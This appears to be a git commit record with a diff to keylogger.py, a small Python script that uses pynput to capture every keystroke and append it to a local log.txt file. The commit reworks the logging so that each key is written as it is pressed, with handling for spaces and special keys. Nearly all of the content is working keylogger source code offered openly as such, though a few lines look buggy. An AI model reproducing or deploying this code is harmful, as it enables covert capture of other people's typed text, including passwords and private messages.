d3707f6a0eee9d81e5fefd3c6d8fdddf208e2081
Kennedy <Tuks1032@gmail.com>
2023-09-10 17:56:48 +0200

    fixed the escape problem

--- keylogger.py
+++ keylogger.py
@@ -2,51 +2,49 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
 
+#Every time the key gets pressed
 def on_press(key):
     global keys, count
     
-    keys.append(key)
-    count += 1
     print("{0} pressed".format(key))
-    
-    if count >= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+    write_file(key)
    
 #breaks out of the loop 
 def on_release(key):
     if key == Key.esc:
         return False
 
+#checks the last character doesn't contain ' '
 def readfile():
     with open('log.txt', 'r') as f:
-        lastCharacter = f.read()
+        lastCharacter = f.read()[-1]
             
-        if(lastCharacter[-1] == ' '):
+        if(lastCharacter == ' '):
             return 'True'
         else:
             return 'False'
-    
+
+# writes to the file  
 def write_file(key):
-    with open('log.txt', 'a') as f:
-        for key in keys:
+    with open('log.txt', 'a') as f:       
             
-            #removes the quotation marks
-            k = str(key).replace("'","")
-            
-            #removes the word space
-            if k == str(Key.space): 
-                isTrue = readfile()
-                if isTrue == 'True':
-                    f.write(' ')
-                else:           
-                    continue
-            if k.find('Key') == -1:
+        #removes the quotation marks from being captured
+        k = str(key).replace("'","")
+        t = k.find("Key")
+     
+        #removes the word space
+        if k == str(Key.space): 
+            isTrue = readfile()
+            if isTrue == 'True':
+                pass                   
+            else:           
+                f.write(' ')
+        else:
+            if k.find("Key") == -1:
                 f.write(k)
+            else:
+                pass
 
 
 if('__main__' == __name__):
